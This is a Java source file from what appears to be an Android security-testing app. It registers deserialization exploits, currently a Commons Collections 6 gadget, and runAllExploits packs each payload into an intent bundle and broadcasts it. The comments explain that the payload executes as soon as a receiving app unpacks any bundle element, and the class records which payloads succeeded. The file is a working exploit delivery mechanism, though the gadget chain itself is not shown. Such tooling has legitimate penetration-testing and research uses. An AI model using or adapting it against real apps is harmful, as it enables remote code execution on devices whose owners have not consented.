package ch.modzero.deserialization_sender.exploits;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import ch.modzero.deserialization_sender.ExploitAdapter;

/**
 * Created by work on 01.12.17.
 */

public class ExploitListSingleton {
    private static final ExploitListSingleton instance = new ExploitListSingleton();
    private ExploitAdapter adapter = null;

    private Map<String, ExploitBase> internalMap = new HashMap<String, ExploitBase>();

    private ExploitListSingleton() {
        // Add all Exploits you want to be available here
        addExploit(new ExploitCommonsCollections6());
    }

    public static ExploitListSingleton getInstance() {
        return instance;
    }

    private void addExploit(ExploitBase exploit) {
        internalMap.put(exploit.getName(), exploit);
    }

    public ArrayList<String> getExploitNames() {
        return new ArrayList(internalMap.keySet());
    }

    public void runAllExploits(Context context, Intent intent, Bundle bundle) {
        // This is the key which is acutally being unpacked by the receiver
        //bundle.putString("decoy", "its content does not matter");

        for (ExploitBase exploit : internalMap.values()) {
            Serializable exploitableObj = null;
            try {
                exploitableObj = exploit.getDeserializable();
            } catch (Exception e) {
                e.printStackTrace();
            }

            // It does not matter which key the exploit is stored under. As soon as any of the elements
            // of the bundle is unpacked, it will be executed.
            bundle.putSerializable(exploit.getName(), exploitableObj);
        }

        intent.putExtras(bundle);

        context.sendBroadcast(intent);
    }

    public void markPayloadSuccessful(String exploitName) {
        if (internalMap.containsKey(exploitName)) {
            internalMap.get(exploitName).markPayloadSuccessful();
            if (adapter != null) {
                adapter.notifyDataSetChanged();
            }
        }
    }

    public boolean wasPayloadSuccessful(String exploitName) {
        if (internalMap.containsKey(exploitName)) {
            return internalMap.get(exploitName).wasPayloadSuccessful();
        }
        else return false;
    }

    public void setAdapter(ExploitAdapter adapter) {
        this.adapter = adapter;
    }
}
